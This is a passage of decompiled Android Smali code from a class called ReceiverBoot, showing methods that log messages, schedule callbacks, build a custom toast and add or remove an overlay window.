    sget v2, Los/system/ReceiverBoot;->delayToast:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 118
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 119
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 120
    invoke-virtual {p0, p1, p5, p3, p4}, Los/system/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;II)V

    goto :goto_0

    .line 123
    :cond_1
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "remove"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget v2, Los/system/ReceiverBoot;->delayToast:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 124
    iget-object v0, p0, Los/system/ReceiverBoot;->mHandler:Landroid/os/Handler;

    iget-object v1, p0, Los/system/ReceiverBoot;->mRefresh:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    goto :goto_0
.end method

.method public toastText(Landroid/content/Context;Ljava/lang/String;II)V
    .locals 5

    .prologue
    const/4 v4, 0x0

    .line 633
    new-instance v0, Landroid/widget/LinearLayout;

    invoke-direct {v0, p1}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 641
    new-instance v1, Landroid/widget/TextView;

    invoke-direct {v1, p1}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 642
    invoke-virtual {v1, p2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 643
    const/high16 v2, -0x1000000

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setTextColor(I)V

    .line 644
    const/high16 v2, 0x41500000    # 13.0f

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setTextSize(F)V

    .line 645
    const/16 v2, 0x11

    invoke-virtual {v1, v2}, Landroid/widget/TextView;->setGravity(I)V

    .line 646
    invoke-virtual {v0, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 648
    new-instance v2, Landroid/widget/Toast;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/widget/Toast;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    .line 649
    iget-object v2, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v2, p4, v4, v4}, Landroid/widget/Toast;->setGravity(III)V

    .line 650
    iget-object v2, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v2, v1}, Landroid/widget/Toast;->setView(Landroid/view/View;)V

    .line 651
    iget-object v1, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v1, v0}, Landroid/widget/Toast;->setView(Landroid/view/View;)V

    .line 653
    iget-object v0, p0, Los/system/ReceiverBoot;->toast:Landroid/widget/Toast;

    invoke-virtual {v0}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v0

    .line 654
    invoke-virtual {v0, p3}, Landroid/view/View;->setBackgroundColor(I)V

    .line 655
    return-void
.end method

.method public windowAlert(Landroid/content/Context;Ljava/lang/String;Z)V
    .locals 8

    .prologue
    const/16 v1, 0x12c

    .line 669
    new-instance v7, Los/system/ReceiverBoot$ViewKu;

    const-string v0, "window"

    const-string v2, "text"

    invoke-direct {v7, p0, p1, v0, v2}, Los/system/ReceiverBoot$ViewKu;-><init>(Los/system/ReceiverBoot;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 671
    if-eqz p3, :cond_0

    .line 672
    const-string v0, "window"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Landroid/view/WindowManager;

    .line 673
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7d6

    const/high16 v4, 0x40000

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 676
    const v1, 0x800033

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 677
    invoke-interface {v6, v7, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 683
    :goto_0
    return-void

    .line 680
    :cond_0
    const-string v0, "window"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    .line 681
    invoke-interface {v0, v7}, Landroid/view/WindowManager;->removeViewImmediate(Landroid/view/View;)V

    goto :goto_0
.end method
